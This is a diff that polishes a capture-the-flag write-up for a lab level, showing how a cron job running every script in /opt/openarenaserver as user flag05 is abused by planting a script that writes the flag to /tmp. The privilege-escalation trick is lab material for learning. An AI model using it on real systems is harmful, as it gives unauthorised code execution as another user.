@@ -1,26 +1,31 @@
-By logging in with the user level05 i received a message : "You have a new mail."
+After logging in as user level05, I received a message: 'You have a new mail.'
 
-I then use the command find , to search every file/dir with the name mail/level05/flag05
-At /var/mail/level05 i found a crontab file :
+I then utilized the 'find' command to search for any file or directory with the name 'mail/level05/flag05.'
+In /var/mail/level05, I discovered a crontab file:
 
-	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```plaintext
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
 
-This is running the command "sh /usr/sbin/openarenaserver" every 2 minutes with the user flag05.
+This crontab is set to execute the command 'sh /usr/sbin/openarenaserver' every 2 minutes with the user flag05.
 
-At /usr/sbin/openarenaserver i found this script :
+Examining /usr/sbin/openarenaserver, I found the following script:
 
-	#!/bin/sh
+```bash
+#!/bin/sh
 
-	for i in /opt/openarenaserver/* ; do
-		(ulimit -t 5; bash -x "$i")
-		rm -f "$i"
-	done
+for i in /opt/openarenaserver/* ; do
+    (ulimit -t 5; bash -x "$i")
+    rm -f "$i"
+done
+```
 
-It runs every program at /opt/openarenaserver and remove them;
+This script runs every program in /opt/openarenaserver and removes them afterward.
+Taking advantage of this, I created a script at /opt/openarenaserver/test:
 
-I created a script at /opt/openarenaserver/test :
+```bash
+#!/bin/sh
+getflag > /tmp/flag
+```
 
-	#!/bin/sh
-	getflag > /tmp/flag
-
-Waited 2 minute and fetched the flag at /tmp/flag
+After waiting for 2 minutes, I retrieved the flag from /tmp/flag.
